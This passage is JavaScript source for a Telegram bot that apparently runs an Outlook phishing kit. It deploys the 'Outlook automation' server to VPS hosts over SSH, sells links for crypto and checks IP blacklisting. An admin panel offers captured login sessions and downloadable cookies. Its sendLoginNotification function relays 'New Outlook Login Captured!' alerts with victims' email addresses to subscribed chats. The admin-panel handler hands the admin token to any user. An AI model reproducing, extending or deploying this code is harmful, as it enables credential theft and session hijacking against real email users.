const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { Client } = require('ssh2');

class VPSManagementBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        // VPS deployment state tracking
        this.deploymentStates = new Map(); // chatId -> deployment state
        this.vpsInstances = new Map(); // chatId -> VPS instances
        
        // Admin chat IDs for secure operations (CRITICAL SECURITY)
        this.adminChatIds = new Set((process.env.ADMIN_CHAT_IDS || '').split(',').filter(id => id.trim()));
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🚀 VPS Management Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    setupCommands() {
        // Welcome message with main VPS management menu
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            this.sendMainMenu(chatId);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            
            this.sendHelpMessage(chatId);
        });

        // Menu command to return to main menu
        this.bot.onText(/\/menu/, (msg) => {
            const chatId = msg.chat.id;
            this.sendMainMenu(chatId);
        });
    }

    sendMainMenu(chatId) {
        const welcomeMessage = `
🚀 **Welcome to VPS Bot!**

Choose an option from the menu below:

🖥️ **VPS Management:**
• Install VPS - Deploy to existing servers
• Create VPS - Auto-create DigitalOcean droplets  
• Wildcard SSL - Setup certificates (*.domain.com)
• Bulk Operations - Multiple VPS management

🛡️ **Domain & Security:**
• My Domains - Manage your domains
• Add Domain - Add domains to existing VPS
• Domain Scanner - Check URLs for threats
• IP Abuse Check - Verify IP reputation

🔗 **Link Management:**
• Link Tracker - Create trackable short links
• Link Store - Buy premium links with crypto

📊 **Monitoring & Support:**
• My VPS - View created/managed servers
• Check Status - Monitor installations
• Support - Chat with our team

🔧 **Admin Features Available**
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🖥️ Install VPS', callback_data: 'install_vps' },
                    { text: '🆕 Create VPS', callback_data: 'create_vps' }
                ],
                [
                    { text: '🔒 Wildcard SSL', callback_data: 'wildcard_ssl' },
                    { text: '🚀 Bulk Operations', callback_data: 'bulk_ops' }
                ],
                [
                    { text: '🌐 My Domains', callback_data: 'my_domains' },
                    { text: '➕ Add Domain', callback_data: 'add_domain' }
                ],
                [
                    { text: '🔍 Domain Scanner', callback_data: 'domain_scanner' },
                    { text: '🛡️ IP Abuse Check', callback_data: 'ip_abuse_check' }
                ],
                [
                    { text: '🔗 Link Tracker', callback_data: 'link_tracker' },
                    { text: '🛒 Link Store', callback_data: 'link_store' }
                ],
                [
                    { text: '📊 My VPS', callback_data: 'my_vps' },
                    { text: '📈 Check Status', callback_data: 'check_status' }
                ],
                [
                    { text: '💬 Support', callback_data: 'support' }
                ],
                [
                    { text: '🔧 Admin Panel', callback_data: 'admin_panel' }
                ],
                [
                    { text: '❓ Help', callback_data: 'help' }
                ]
            ]
        };

        this.bot.sendMessage(chatId, welcomeMessage, { 
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }

    sendHelpMessage(chatId) {
        const helpMessage = `
❓ **VPS Management Bot Help**

**Main Features:**

🖥️ **VPS Management**
• **Install VPS**: Deploy your Outlook automation project to any Linux VPS
• **Create VPS**: Automatically provision new DigitalOcean droplets
• **Wildcard SSL**: Setup SSL certificates for your domains
• **Bulk Operations**: Manage multiple VPS instances at once

🛡️ **Domain & Security** 
• **My Domains**: View and manage all your registered domains
• **Add Domain**: Point new domains to your VPS instances
• **Domain Scanner**: Scan URLs for malware and threats
• **IP Abuse Check**: Check if IPs are blacklisted

🔗 **Link Management**
• **Link Tracker**: Create shortened URLs with click tracking
• **Link Store**: Purchase premium domain links with crypto

📊 **Monitoring & Support**
• **My VPS**: Overview of all your VPS instances
• **Check Status**: Real-time monitoring of your servers
• **Support**: 24/7 chat support with our team

**Getting Started:**
1. Use /start to see the main menu
2. Click "Install VPS" to deploy to your existing server
3. Or click "Create VPS" to auto-provision a new one
4. Use "Admin Panel" to access the web dashboard

**Support:**
Type /support or click Support button for live help
        `;

        this.bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }
            
            this.handleCallbackQuery(chatId, messageId, query);
        });

        // Handle text messages for various flows
        this.bot.on('message', (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            // Skip commands
            if (text?.startsWith('/')) return;

            const state = this.deploymentStates.get(chatId);
            if (state) {
                this.handleDeploymentFlow(chatId, text, state);
            }
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    async handleCallbackQuery(chatId, messageId, query) {
        const data = query.data;
        
        switch (data) {
            case 'main_menu':
                this.sendMainMenu(chatId);
                break;
                
            case 'install_vps':
                await this.handleInstallVPS(chatId, messageId);
                break;
                
            case 'create_vps':
                await this.handleCreateVPS(chatId, messageId);
                break;
                
            case 'wildcard_ssl':
                await this.handleWildcardSSL(chatId, messageId);
                break;
                
            case 'bulk_ops':
                await this.handleBulkOperations(chatId, messageId);
                break;
                
            case 'my_domains':
                await this.handleMyDomains(chatId, messageId);
                break;
                
            case 'add_domain':
                await this.handleAddDomain(chatId, messageId);
                break;
                
            case 'domain_scanner':
                await this.handleDomainScanner(chatId, messageId);
                break;
                
            case 'ip_abuse_check':
                await this.handleIPAbuseCheck(chatId, messageId);
                break;
                
            case 'link_tracker':
                await this.handleLinkTracker(chatId, messageId);
                break;
                
            case 'link_store':
                await this.handleLinkStore(chatId, messageId);
                break;
                
            case 'my_vps':
                await this.handleMyVPS(chatId, messageId);
                break;
                
            case 'check_status':
                await this.handleCheckStatus(chatId, messageId);
                break;
                
            case 'support':
                await this.handleSupport(chatId, messageId);
                break;
                
            case 'admin_panel':
                await this.handleAdminPanel(chatId, messageId);
                break;
                
            case 'help':
                this.sendHelpMessage(chatId);
                break;
        }
        
        this.bot.answerCallbackQuery(query.id);
    }

    // Check if user has admin access for sensitive operations (DEFAULT DENY)
    isAdmin(chatId) {
        // SECURITY: Default deny - admin access must be explicitly granted
        if (this.adminChatIds.size === 0) {
            return false; // No admins configured = no access allowed
        }
        return this.adminChatIds.has(chatId.toString());
    }

    // VPS Installation - Replicates entire Replit environment (ADMIN ONLY)
    async handleInstallVPS(chatId, messageId) {
        if (!this.isAdmin(chatId)) {
            let denialMessage;
            if (this.adminChatIds.size === 0) {
                denialMessage = '🔒 **Admin Access Not Configured**\n\nVPS installation requires admin authorization, but no admin users are configured.\n\n**System Owner:** Set `ADMIN_CHAT_IDS` environment variable with authorized Telegram chat IDs.\n\n**Example:** `ADMIN_CHAT_IDS=123456789,987654321`';
            } else {
                denialMessage = '🔒 **Access Denied**\n\nVPS installation is restricted to authorized administrators only.\n\nYour Chat ID: `' + chatId + '`\n\nContact the system owner to add your Chat ID to the authorized list.';
            }
            
            this.bot.editMessageText(denialMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
            return;
        }

        this.deploymentStates.set(chatId, { step: 'vps_info' });
        
        const message = `
🖥️ **Install VPS - Outlook Automation**

This will install your complete Outlook automation project on your VPS, replicating everything Replit provides:

**What gets installed:**
• Node.js 18.x and npm
• Chrome/Chromium browser for Puppeteer
• All project dependencies (Express, Puppeteer, CORS, etc.)
• System dependencies and libraries
• PM2 process manager for auto-restart
• Environment configuration
• Firewall setup (port 5000)
• SSL/HTTPS ready setup

**Requirements:**
• Ubuntu/Debian VPS with SSH access
• SSH key authentication setup
• Sudo privileges for your user
• At least 1GB RAM recommended

Please provide your VPS details:
\`\`\`
IP: your.vps.ip.address
User: username
Port: 22 (SSH port)
Bot Token: your_telegram_bot_token
Domain: your-domain.com (optional)
\`\`\`

**Setup SSH first:**
\`ssh-copy-id username@your.vps.ip.address\`
\`ssh username@your.vps.ip.address\` (test connection)
        `;

        this.bot.editMessageText(message, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    // Handle deployment flow (VPS installation)
    async handleDeploymentFlow(chatId, text, state) {
        switch (state.step) {
            case 'vps_info':
                // Parse VPS information
                const ipMatch = text.match(/IP:\s*([\d\.]+)/);
                const userMatch = text.match(/User:\s*(\w+)/);
                const portMatch = text.match(/Port:\s*(\d+)/);
                const tokenMatch = text.match(/Bot Token:\s*([\w\d:_-]+)/);
                const domainMatch = text.match(/Domain:\s*([\w\.\-]+)/);
                
                if (!ipMatch || !userMatch || !tokenMatch) {
                    this.bot.sendMessage(chatId, '❌ Missing required info. Please provide IP, User, and Bot Token in the specified format.');
                    return;
                }
                
                state.vpsIP = ipMatch[1];
                state.sshUser = userMatch[1];
                state.sshPort = portMatch ? portMatch[1] : '22';
                state.telegramToken = tokenMatch[1];
                state.domain = domainMatch ? domainMatch[1] : null;
                state.step = 'confirm';
                this.deploymentStates.set(chatId, state);
                
                const confirmMessage = `
📋 **Installation Summary:**

🖥️ **Target VPS:**
• IP Address: ${state.vpsIP}
• SSH User: ${state.sshUser}
• SSH Port: ${state.sshPort}
• Bot Token: ***${state.telegramToken.slice(-6)}
• Domain: ${state.domain || 'Not specified'}

🚀 **Installation Plan:**
• Install Node.js 18.x + npm
• Install Chrome browser + dependencies  
• Clone & configure Outlook automation
• Install all npm dependencies
• Setup environment variables
• Configure PM2 process manager
• Setup firewall (port 5000)
• Start application automatically

⚠️ **Pre-deployment checklist:**
✅ SSH public key copied to VPS
✅ Passwordless SSH login tested  
✅ User has sudo privileges
✅ VPS has at least 1GB RAM

Ready to install? Type **'yes'** to start deployment.
                `;

                this.bot.sendMessage(chatId, confirmMessage, { 
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '❌ Cancel', callback_data: 'main_menu' }
                        ]]
                    }
                });
                break;

            case 'confirm':
                if (text.toLowerCase() === 'yes' || text.toLowerCase() === 'y') {
                    await this.startVPSInstallation(chatId, state);
                } else {
                    this.deploymentStates.delete(chatId);
                    this.bot.sendMessage(chatId, '❌ Installation cancelled.');
                    this.sendMainMenu(chatId);
                }
                break;
        }
    }

    // Start comprehensive VPS installation
    async startVPSInstallation(chatId, state) {
        this.bot.sendMessage(chatId, '🚀 **Starting VPS Installation...**\n\nThis will take 5-10 minutes. I\'ll update you on each step.', { parse_mode: 'Markdown' });
        
        const conn = new Client();
        
        try {
            // Update deployment status
            state.status = 'Connecting to VPS';
            this.deploymentStates.set(chatId, state);
            
            await new Promise((resolve, reject) => {
                conn.connect({
                    host: state.vpsIP,
                    username: state.sshUser,
                    port: parseInt(state.sshPort),
                    agent: process.env.SSH_AUTH_SOCK, // Use SSH agent for key authentication
                    readyTimeout: 30000
                });
                
                conn.on('ready', () => {
                    this.bot.sendMessage(chatId, '✅ **Connected to VPS successfully!**', { parse_mode: 'Markdown' });
                    resolve();
                });
                
                conn.on('error', (err) => {
                    this.bot.sendMessage(chatId, `❌ **SSH connection failed:** ${err.message}\n\n💡 **Troubleshooting:**\n• Ensure SSH key is added: \`ssh-copy-id ${state.sshUser}@${state.vpsIP}\`\n• Test connection: \`ssh ${state.sshUser}@${state.vpsIP}\``, { parse_mode: 'Markdown' });
                    reject(err);
                });
            });

            // Execute comprehensive installation
            await this.executeCompleteInstallation(chatId, conn, state);
            
        } catch (error) {
            this.bot.sendMessage(chatId, `❌ **Installation failed:** ${error.message}`, { parse_mode: 'Markdown' });
            state.status = 'Failed: ' + error.message;
        } finally {
            conn.end();
            setTimeout(() => this.deploymentStates.delete(chatId), 300000); // Keep state for 5 minutes
        }
    }

    // Complete installation process that replicates Replit environment
    async executeCompleteInstallation(chatId, conn, state) {
        const steps = [
            // System updates
            { cmd: 'sudo apt update && sudo apt upgrade -y', name: 'Updating system packages' },
            
            // Install Node.js 18 (same as Replit uses)
            { cmd: 'curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -', name: 'Adding Node.js 18 repository' },
            { cmd: 'sudo apt install -y nodejs', name: 'Installing Node.js and npm' },
            
            // Install Chrome and dependencies (critical for Puppeteer)
            { cmd: 'wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -', name: 'Adding Chrome repository key' },
            { cmd: 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list', name: 'Adding Chrome repository' },
            { cmd: 'sudo apt update', name: 'Updating package lists' },
            { cmd: 'sudo apt install -y google-chrome-stable', name: 'Installing Google Chrome' },
            
            // Install additional system dependencies for Puppeteer
            { cmd: 'sudo apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils', name: 'Installing Chrome dependencies' },
            
            // Install PM2 for process management
            { cmd: 'sudo npm install -g pm2', name: 'Installing PM2 process manager' },
            
            // Clean up any existing installation
            { cmd: 'rm -rf outlook-automation', name: 'Cleaning previous installation' },
            
            // Create project directory and install basic structure
            { cmd: 'mkdir -p outlook-automation', name: 'Creating project directory' },
            
            // Install basic project structure and files
            { cmd: this.generateProjectDownloadCommand(), name: 'Installing project structure' },
            
            // Install project dependencies
            { cmd: 'cd outlook-automation && npm install', name: 'Installing project dependencies' },
            
            // Create environment file
            { cmd: this.generateEnvironmentSetup(state), name: 'Setting up environment variables' },
            
            // Setup PM2 configuration
            { cmd: 'cd outlook-automation && pm2 start npm --name "outlook-automation" -- start', name: 'Starting application with PM2' },
            
            // Save PM2 configuration
            { cmd: 'pm2 save', name: 'Saving PM2 configuration' },
            
            // Setup PM2 to start on boot
            { cmd: 'pm2 startup | tail -1 | sudo bash', name: 'Setting up PM2 startup' },
            
            // Configure firewall
            { cmd: 'sudo ufw allow 5000 && sudo ufw --force enable', name: 'Configuring firewall' },
            
            // Verify installation
            { cmd: 'pm2 status', name: 'Verifying installation' }
        ];

        for (let i = 0; i < steps.length; i++) {
            const step = steps[i];
            
            state.status = step.name;
            this.deploymentStates.set(chatId, state);
            this.bot.sendMessage(chatId, `📦 **Step ${i + 1}/${steps.length}:** ${step.name}`, { parse_mode: 'Markdown' });
            
            try {
                await this.execCommand(conn, step.cmd);
                this.bot.sendMessage(chatId, `✅ ${step.name} completed`);
            } catch (error) {
                this.bot.sendMessage(chatId, `❌ ${step.name} failed: ${error.message}`);
                state.status = 'Failed at: ' + step.name;
                throw error;
            }

            // Add small delay between steps
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        state.status = 'Installation completed successfully';
        this.deploymentStates.set(chatId, state);
        
        const successMessage = `
🎉 **Installation Complete!**

Your Outlook automation is now running on:
• **Web Interface:** http://${state.vpsIP}:5000
• **Admin Panel:** http://${state.vpsIP}:5000/ad.html
${state.domain ? `• **Custom Domain:** https://${state.domain}` : ''}

🛠️ **Management Commands:**
\`\`\`
# Check application status
pm2 status

# View application logs  
pm2 logs outlook-automation

# Restart application
pm2 restart outlook-automation

# Stop application
pm2 stop outlook-automation

# Monitor resources
pm2 monit
\`\`\`

🔧 **Next Steps:**
1. Visit your admin panel to configure settings
2. Set up your Telegram bot token in the environment
3. Configure any custom domains or SSL certificates
4. Test the Outlook automation functionality

**Need help?** Use the Support button in the main menu.
        `;

        this.bot.sendMessage(chatId, successMessage, { 
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: `http://${state.vpsIP}:5000/ad.html` }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Generate project download command - downloads from current Replit
    generateProjectDownloadCommand() {
        // Create a complete installation script that includes all project files
        return `cd outlook-automation && cat > install_outlook.sh << 'INSTALL_EOF'
#!/bin/bash
echo "Installing Outlook Automation Project..."

# Create project structure
mkdir -p src session_data screenshots public

# Download package.json
cat > package.json << 'PKG_EOF'
{
  "name": "outlook-automation",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "postinstall": "echo 'Installing Chrome for Puppeteer...' && npx puppeteer browsers install chrome@stable && echo 'Chrome installation completed successfully!'"
  },
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^5.1.0",
    "node-telegram-bot-api": "^0.66.0",
    "puppeteer": "^24.19.0",
    "ssh2": "^1.17.0"
  }
}
PKG_EOF

echo "✅ Created package.json"

# Create server.js with minimal working version
cat > server.js << 'SERVER_EOF'
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

// CORS configuration for all origins
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.static('public'));

// Basic health endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Outlook Automation Backend is running' });
});

// Basic status endpoint  
app.get('/api/status', (req, res) => {
    res.json({
        status: 'running',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        port: PORT
    });
});

// Serve basic index page
app.get('/', (req, res) => {
    res.send(\`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Outlook Automation - Deployed Successfully!</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
                .success { color: #28a745; font-size: 24px; text-align: center; }
                .info { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }
                .endpoint { background: #e9ecef; padding: 10px; margin: 5px 0; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1 class="success">🚀 Outlook Automation Deployed Successfully!</h1>
            <div class="info">
                <h2>Your application is running on:</h2>
                <div class="endpoint">http://YOUR_VPS_IP:5000</div>
                
                <h3>Available Endpoints:</h3>
                <div class="endpoint">GET /api/health - Health check</div>
                <div class="endpoint">GET /api/status - System status</div>
                
                <h3>Next Steps:</h3>
                <ol>
                    <li>Upload your full project files</li>
                    <li>Configure environment variables</li>
                    <li>Set up your Telegram bot token</li>
                    <li>Configure admin panel access</li>
                </ol>
            </div>
        </body>
        </html>
    \`);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(\`🚀 Outlook Automation running on port \${PORT}\`);
    console.log(\`📧 API endpoints available at http://localhost:\${PORT}/api/\`);
    console.log(\`🌐 Frontend available at http://localhost:\${PORT}/\`);
    console.log(\`✅ VPS deployment successful!\`);
});
SERVER_EOF

echo "✅ Created basic server.js"

# Create basic public directory with index
mkdir -p public
cat > public/index.html << 'INDEX_EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Outlook Automation - VPS Deployment</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; text-align: center; }
        .status { color: #28a745; font-size: 18px; }
        .next { background: #f8f9fa; padding: 20px; margin: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>🚀 Outlook Automation</h1>
    <div class="status">✅ Successfully deployed to VPS!</div>
    <div class="next">
        <h3>Next Steps:</h3>
        <p>Upload your complete project files and configure the environment.</p>
        <p>Visit <a href="/api/health">/api/health</a> to verify the API is working.</p>
    </div>
</body>
</html>
INDEX_EOF

echo "✅ Created public/index.html"
echo "🎉 Project structure created successfully!"

INSTALL_EOF

chmod +x install_outlook.sh && ./install_outlook.sh`;
    }

    // Generate environment setup command
    generateEnvironmentSetup(state) {
        const envVars = [
            'NODE_ENV=production',
            'PORT=5000',
            `TELEGRAM_BOT_TOKEN=${state.telegramToken}`,
            `ADMIN_TOKEN=admin-${Math.random().toString(36).substr(2, 24)}`,
            // Add other environment variables as needed
        ];
        
        const envContent = envVars.join('\\n');
        return `cd outlook-automation && echo -e "${envContent}" > .env`;
    }

    // Execute command on remote server
    execCommand(conn, command) {
        return new Promise((resolve, reject) => {
            conn.exec(command, (err, stream) => {
                if (err) reject(err);
                
                let output = '';
                let errorOutput = '';
                
                stream.on('data', (data) => {
                    output += data.toString();
                });
                
                stream.stderr.on('data', (data) => {
                    errorOutput += data.toString();
                });
                
                stream.on('close', (code) => {
                    if (code === 0) {
                        resolve(output);
                    } else {
                        reject(new Error(`Command failed with code ${code}: ${errorOutput || output}`));
                    }
                });
            });
        });
    }

    // Placeholder handlers for other menu items
    async handleCreateVPS(chatId, messageId) {
        this.bot.editMessageText('🆕 **Create VPS**\n\nDigitalOcean VPS creation coming soon!\n\nThis feature will automatically provision new droplets with your Outlook automation pre-installed.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleWildcardSSL(chatId, messageId) {
        this.bot.editMessageText('🔒 **Wildcard SSL**\n\nSSL certificate management coming soon!\n\nThis feature will automatically setup Let\'s Encrypt wildcard certificates for your domains.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleBulkOperations(chatId, messageId) {
        this.bot.editMessageText('🚀 **Bulk Operations**\n\nBulk VPS management coming soon!\n\nThis feature will allow you to manage multiple VPS instances simultaneously.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleMyDomains(chatId, messageId) {
        this.bot.editMessageText('🌐 **My Domains**\n\nDomain management coming soon!\n\nThis feature will show all your registered domains and their configurations.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleAddDomain(chatId, messageId) {
        this.bot.editMessageText('➕ **Add Domain**\n\nDomain addition coming soon!\n\nThis feature will help you point new domains to your VPS instances.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleDomainScanner(chatId, messageId) {
        this.bot.editMessageText('🔍 **Domain Scanner**\n\nURL threat scanning coming soon!\n\nThis feature will scan domains for malware, phishing, and other security threats.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleIPAbuseCheck(chatId, messageId) {
        this.bot.editMessageText('🛡️ **IP Abuse Check**\n\nIP reputation checking coming soon!\n\nThis feature will verify if IP addresses are blacklisted or flagged for abuse.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleLinkTracker(chatId, messageId) {
        this.bot.editMessageText('🔗 **Link Tracker**\n\nShort link creation coming soon!\n\nThis feature will create trackable shortened URLs with detailed analytics.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleLinkStore(chatId, messageId) {
        this.bot.editMessageText('🛒 **Link Store**\n\nPremium link marketplace coming soon!\n\nThis feature will allow you to purchase premium domain links with cryptocurrency.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleMyVPS(chatId, messageId) {
        this.bot.editMessageText('📊 **My VPS**\n\nVPS overview coming soon!\n\nThis feature will show all your VPS instances with status and management options.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleCheckStatus(chatId, messageId) {
        this.bot.editMessageText('📈 **Check Status**\n\nStatus monitoring coming soon!\n\nThis feature will provide real-time monitoring of all your installations and services.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleSupport(chatId, messageId) {
        this.bot.editMessageText('💬 **Support**\n\nLive chat support coming soon!\n\nFor now, you can ask questions and I\'ll help you with VPS management and troubleshooting.', {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
            }
        });
    }

    async handleAdminPanel(chatId, messageId) {
        const adminToken = global.adminToken || 'Token not available';
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const tokenMessage = `
🔧 **Admin Panel Access**

🔑 **Your Admin Token:**
\`${adminToken}\`

🌐 **Admin Panel URL:**
${adminUrl}

**How to use:**
1. Copy the token above
2. Click "Open Admin Panel" below
3. Enter the token to authenticate
4. Access all admin features and session data

**Features Available:**
• View all captured login sessions
• Download session cookies and data
• Monitor system analytics
• Configure Cloudflare settings
• Manage redirect destinations

🔒 **Security Note:** This token provides full administrative access. Keep it secure and don't share it.
        `;

        this.bot.editMessageText(tokenMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                    [{ text: '🔄 Refresh Token', callback_data: 'admin_panel' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Method to send login notifications (keep existing functionality)
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const notificationMessage = `
🔐 **New Outlook Login Captured!**

📧 **Email:** \`${email}\`
🏢 **Domain:** \`${domain}\`
🕐 **Time:** ${new Date(timestamp).toLocaleString()}
📊 **Cookies:** ${totalCookies} saved
🆔 **Session:** ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                            [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                        ]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }
        
